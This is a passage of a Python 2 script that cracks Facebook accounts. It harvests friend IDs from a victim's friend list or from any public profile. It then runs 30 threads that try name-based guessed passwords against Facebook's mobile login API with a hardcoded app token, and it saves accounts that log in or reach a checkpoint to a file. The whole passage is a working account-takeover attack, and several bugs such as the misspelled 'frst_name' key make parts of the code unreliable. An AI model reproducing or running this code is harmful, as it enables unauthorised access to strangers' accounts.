						else:
							pass3 = b['first_name'] + '1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass3 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass3 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['last_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass4 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass4 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'Kontol'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass5 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass5 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)

											                              
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;93m[\x1b[1;32;92m-->>\033[1;93m] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;93m[\x1b[1;32;92m-->>\033[1;93m] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/kgf.txt")
	print("\033[1;97m--------------------------------------------------")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	login()
	
def malai():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo2
	print("\033[1;97m--------------------------------------------------")
	print( "\x1b[1;32;92m[1]\033[1;33;98m-->>\033[1;95mCrack From Friendlist ID ") 
	print( "\x1b[1;32;92m[2]\033[1;33;98m-->>\033[1;95mCrack From Any Public ID") 
	print( "\x1b[1;32;36m[0]\033[1;33;96m-->>\033[1;91mBack") 
	print("\033[1;97m--------------------------------------------------")
	pilih_malai()

def pilih_malai():
	peak = raw_input("\n\033[1;31;40m--> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_malai()
	elif peak =="1":
		os.system('clear')
		print logo
		jalan('\033[1;93m[\x1b[1;32;92m-->>\033[1;93m] \033[1;93mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;93m[\x1b[1;32;92m-->>\033[1;93m]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		print("\033[1;97m--------------------------------------------------")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m\033[1;31;37m[\033[1;93m<-\x1b[1;32;92m+\033[1;93m->\033[1;31;37m]\x1b[1;94m Name\x1b[1;91m :\033[1;36;40m : "+op["name"]
		except KeyError:
			print"\x1b[1;32;92m[\x1b[1;31m!\x1b[1;32;92m]\033[1;31;37m ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			malai()
		print"\033[1;96m[\033[1;32;40m-->>\x1b[1;96m] \033[1;93mGetting ID"
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_malai()

	
	print "\033[1;36;96m[\x1b[1;91m-->>\033[1;36;96m]\x1b[1;32;92m Total IDs\x1b[1;91m : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[\033[1;93m-->>\033[1;34;96m]\033[1;36;96m Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		     print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-------\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m------»"
	print "\033[1;97m «------------------------------------------------»"
	
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['last_name'] + '123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass1 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass1 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass2 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass2 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass3 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass3 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['last_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass4 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass4 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '123456'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass5 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass5 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)

											                              
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;93m[\x1b[1;32;92m-->>\033[1;93m] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;93m[\x1b[1;32;92m-->>\033[1;93m] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/kgf.txt")
	print("\033[1;97m--------------------------------------------------")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	login()

						
if __name__ == '__main__':
	login()

